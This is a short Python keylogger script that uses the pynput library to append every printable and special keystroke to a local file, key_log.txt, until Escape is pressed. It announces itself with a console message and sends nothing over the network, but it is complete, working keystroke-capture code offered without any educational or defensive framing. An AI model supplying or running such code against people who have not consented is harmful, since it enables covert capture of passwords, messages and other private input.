from pynput import keyboard

# File where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # If key is printable
            file.write(f"{key.char}")
    except AttributeError:
        # For special keys (space, shift, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    # Stop listener with Escape key
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
